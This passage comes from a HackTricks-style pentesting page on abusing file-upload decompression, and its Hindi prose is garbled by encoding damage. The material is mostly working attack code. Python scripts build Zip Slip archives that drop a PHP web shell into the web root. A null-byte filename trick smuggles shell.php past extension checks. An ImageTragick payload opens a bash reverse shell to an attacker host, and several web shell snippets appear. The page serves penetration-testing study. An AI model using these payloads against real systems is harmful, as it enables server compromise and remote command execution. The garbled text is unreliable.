рдЖрд╕рд╛рдиреА рд╕реЗ рд╕реЛрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рд╕реЗрдЯрдЕрдк рдЦрд╝рд░рд╛рдм рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдУрдПрд╕ рд╕реНрддрд░ рдХреЗ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рд▓реЗрдХрд┐рди рджреБрд░реНрднрд╛рдЧреНрдп рд╕реЗ рдпрд╣ рд╕рдЪ рдирд╣реАрдВ рд╣реИред рдХреНрдпреЛрдВрдХрд┐ ZIP рдЖрд░реНрдХрд╛рдЗрд╡ рдкреНрд░рд╛рд░реВрдк рд╣рд╛рд░реНрдХрд┐рдпрд░реНрдХрд▓ рдХрдВрдкреНрд░реЗрд╢рди рдХреЛ рд╕рдорд░реНрдерд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╣рдо рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХрд╛ рд╕рдВрджрд░реНрдн рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рдо рд▓рдХреНрд╖реНрдп рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреА рдбреАрдХрдВрдкреНрд░реЗрд╢рди рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдЕрдкрд▓реЛрдб рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рддрд░рд╣ рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрддреНрдкрд╛рджрди рдпрд╣рд╛рдВ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ: [https://github.com/ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)
```python
python evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
рдХреБрдЫ рдкрд╛рдпрдерди рдХреЛрдб рдПрдХ рджреБрд╖реНрдЯ рдЬрд╝рд┐рдк рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП:

```python
import zipfile

# Create a new zip file
zip_file = zipfile.ZipFile('malicious.zip', 'w')

# Add a malicious file to the zip
zip_file.write('malicious_file.exe')

# Close the zip file
zip_file.close()
```

рдпрд╣рд╛рдВ `malicious_file.exe` рдПрдХ рджреБрд╖реНрдЯ рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬреЛ рдЖрдк рдЬрд╝рд┐рдк рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред рдЖрдк рдЗрд╕ рдХреЛрдб рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рдмрд╛рдж, `malicious.zip` рдирд╛рдордХ рдПрдХ рдирдпрд╛ рдЬрд╝рд┐рдк рдлрд╝рд╛рдЗрд▓ рдмрдиреЗрдЧреА рдЬрд┐рд╕рдореЗрдВ рдпрд╣ рджреБрд╖реНрдЯ рдлрд╝рд╛рдЗрд▓ рд╢рд╛рдорд┐рд▓ рд╣реЛрдЧреАред
```python
#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def create_zip():
f = StringIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
рджреВрд░рд╕реНрде рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореИрдВрдиреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдо рдЙрдард╛рдП:

1. рдПрдХ PHP рд╢реИрд▓ рдмрдирд╛рдПрдВ:
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2. "рдлрд╝рд╛рдЗрд▓ рд╕реНрдкреНрд░реЗ" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдПрдХ рд╕рдВрдкреАрдбрд╝рд┐рдд рдЬрд╝рд┐рдк рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдВ:
```text
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
adding: xxAcmd.php (deflated 40%)
adding: xxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
```
3. рд╣реЗрдХреНрд╕ рдПрдбрд┐рдЯрд░ рдпрд╛ рд╡реАрдЖрдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ "xxA" рдХреЛ "../" рдореЗрдВ рдмрджрд▓реЗрдВ, рдореИрдВрдиреЗ рд╡реАрдЖрдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛:
```text
:set modifiable
:%s/xxA/..\//g
:x!
```
рдХреЗрд╡рд▓ рдПрдХ рдХрджрдо рд╢реЗрд╖ рд░рд╣ рдЧрдпрд╛: ZIP рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЗрд╕реЗ рдбреАрдХрдВрдкреНрд░реЗрд╕ рдХрд░рдиреЗ рджреЗрдВ! рдпрджрд┐ рдпрд╣ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдУрдПрд╕ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рд╢реИрд▓реА рд╣реЛрдЧреА:

[![b1](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1-300x106.png)](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1.png)

**рд╕рдВрджрд░реНрдн**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

## рдПрдХ рдЕрд▓рдЧ рдирд╛рдо рдХреЗ рд╕рд╛рде рдбреАрдХрдВрдкреНрд░реЗрд╕ рдХрд░реЗрдВ

рдХрднреА-рдХрднреА рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓реЛрдб рд╣реЛрдиреЗ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░ рджреЗрддрд╛ рд╣реИ рдЬрдмрдХрд┐ рдпрд╣ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдЬрд╝рд┐рдк рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдХрд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреНрдпрд╛ рд╣реИред рдпрджрд┐ рдпрд╣ рд╕рддрд░реНрдХрддрд╛ рд╕рддрд╣реА рд╣реИ, рдЕрд░реНрдерд╛рдд рд▓реЛрдХрд▓ рдлрд╝реАрд▓реНрдб рд╣реИрдбрд░ рдХреЗ рдЕрдВрджрд░ рдХреА рдлрд╝рд╛рдЗрд▓ рдХреЗ рдирд╛рдо рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ, рддреЛ рдЗрд╕реЗ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдзреЛрдЦрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рджреВрд╕рд░реЗ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдмрдирд╛рдХрд░ рдЖрдк рдЗрд╕реЗ рдЪрдХреНрд░рд╡реНрдпреВрд╣ рдореЗрдВ рдбреАрдХрдВрдкреНрд░реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╣рдо рдкрд┐рдЫрд▓реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдлрд┐рд░ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЬрд╝рд┐рдк рдлрд╝рд╛рдЗрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред
```python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('shell.php .pdf', '<?php echo system($_REQUEST["cmd"]); ?>')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдирд╛рдо рдореЗрдВ рдЗрд╕рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╕реНрдерд╛рди рд╣реИред рдЕрдм рдЖрдк рдПрдХ рд╣реЗрдХреНрд╕ рд╕рдВрдкрд╛рджрдХ рдХреЗ рд╕рд╛рде рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЧрдП рдЬрд╝рд┐рдк рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдХреЗрдВрджреНрд░реАрдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИрдбрд░ рдХреЗ рдЕрдВрджрд░ рд╕реНрдерд┐рдд рдирд╛рдо рдореЗрдВ рдЗрд╕ рд╡рд░реНрдЧ рдХреЛ рдПрдХ рд╢реВрдиреНрдп рдмрд╛рдЗрдЯ `00` рд╕реЗ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# before changing the name of the file inside the Central Directory header
00000080: 0000 0073 6865 6c6c 2e70 6870 202e 7064  ...shell.php .pd
# after changing the name of the file inside the Central Directory header
00000080: 0000 0073 6865 6c6c 2e70 6870 002e 7064  ...shell.php..pd
```
рдЬрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬрд╝рд┐рдк рдХреЗ рдЕрдВрджрд░ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдлрд╝рд╛рдЗрд▓рдиреЗрдо рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛, рддреЛ рдЗрд╕ рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдирд╛рдо рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╣реИрдбрд░ рдХрд╛ рдирд╛рдо рд╣реЛрдЧрд╛, **рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдЬрд╝рд┐рдк рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╣реИ рддреЛ рдирд╣реАрдВ** (pkzip рд╕реНрдкреЗрд╕рд┐рдлрд┐рдХреЗрд╢рди рджреЗрдЦреЗрдВ)ред рдЬрдм 7z рдпрд╛ unzip рджреЛ рдирд╛рдореЛрдВ рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рджреЗрдЦреЗрдВрдЧреЗ, рддреЛ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдирд╛рдо рд╕реЗрдВрдЯреНрд░рд▓ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╣реЗрдбрд░ рдХрд╛ рдирд╛рдо рд╣реЛрдЧрд╛ред рдирд▓ рдмрд╛рдЗрдЯ рдХреЗ рдзрдиреНрдпрд╡рд╛рдж рд╕реЗ, рдирд╛рдо `shell.php` рд╣реЛрдЧрд╛ред

рдЬрдм рдбреАрдХрдВрдкреНрд░реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:
```bash
7z e poc.zip
ls
shell.php
```
**рд╕рдВрджрд░реНрдн**:

[https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html](https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html)

[https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT](https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT)

# ImageTragic

рдЗрд╕ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ рдЫрд╡рд┐ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рддрд╛рдХрд┐ рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗ **\(ImageMagick, 7.0.1-1\)**
```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
# PGN рдореЗрдВ PHP рд╢реЗрд▓ рдПрдореНрдмреЗрдб рдХрд░рдирд╛

IDAT рдЪрдВрдХ рдореЗрдВ рд╡реЗрдм рд╢реЗрд▓ рд░рдЦрдиреЗ рдХрд╛ рдкреНрд░рд╛рдердорд┐рдХ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдЗрд╕рдХреЗ рдкрд╛рд╕ рд░реАрд╕рд╛рдЗрдЬрд╝ рдФрд░ рд░реА-рд╕реИрдВрдкрд▓рд┐рдВрдЧ рдСрдкрд░реЗрд╢рдиреЛрдВ рдХреЛ рдЫрд▓рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИ - PHP-GD рдореЗрдВ рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреЛ рдлрд╝рдВрдХреНрд╢рди рд╣реЛрддреЗ рд╣реИрдВ [imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php) рдФрд░ [imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php).

рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЛ рдкрдврд╝реЗрдВ: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

# рдкреЙрд▓реАрдЧреНрд▓реЙрдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ

рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ, рдкреЙрд▓реАрдЧреНрд▓реЙрдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ рдРрд╕реА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ рдЬреЛ рдХрдИ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЗ рдорд╛рдиреНрдп рд░реВрдк рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, [GIFAR](https://en.wikipedia.org/wiki/Gifar) рдПрдХ GIF рдФрд░ RAR рдлрд╝рд╛рдЗрд▓ рджреЛрдиреЛрдВ рд╣реИред рд╡рд╣рд╛рдВ рдРрд╕реА рднреА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ рдЬреЛ GIF рдФрд░ JS, PPT рдФрд░ JS, рдЖрджрд┐ рджреЛрдиреЛрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред

рдкреЙрд▓реАрдЧреНрд▓реЙрдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдХреНрд╕рд░ рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдХрд╛рд░ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЫрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВред рдмрд╣реБрдд рд╕рд╛рд░реЗ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдХреЗрд╡рд▓ рдирд┐рд╢реНрдЪрд┐рдд рдкреНрд░рдХрд╛рд░реЛрдВ рдЬреИрд╕реЗ JPEG, GIF, DOC рдЬреИрд╕реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ JS рдлрд╝рд╛рдЗрд▓реЗрдВ, PHP рдлрд╝рд╛рдЗрд▓реЗрдВ рдпрд╛ Phar рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬреИрд╕реА рд╕рдВрднрд╛рд╡рд┐рдд рдЦрддрд░рдирд╛рдХ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХреЗред

рдЗрд╕рд╕реЗ рдРрд╕реА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдорд┐рд▓рддреА рд╣реИ рдЬреЛ рдХрдИ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдкреНрд░рд╛рд░реВрдкреЛрдВ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддреА рд╣реИред рдпрд╣ рдЖрдкрдХреЛ рдПрдХ PHAR рдлрд╝рд╛рдЗрд▓ (PHp ARchive) рдХреЛ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ рдПрдХ JPEG рдХреА рддрд░рд╣ рджрд┐рдЦрддреА рд╣реИ, рд▓реЗрдХрд┐рди рд╢рд╛рдпрдж рдЖрдкрдХреЛ рдПрдХ рдорд╛рдиреНрдп рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдФрд░ рдпрджрд┐ рдЕрдкрд▓реЛрдб рдлрд╝рдВрдХреНрд╢рди рдЗрд╕реЗ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ рддреЛ рдпрд╣ рдЖрдкрдХреА рдорджрдж рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)





<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдиреЗ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ**ред

</details>
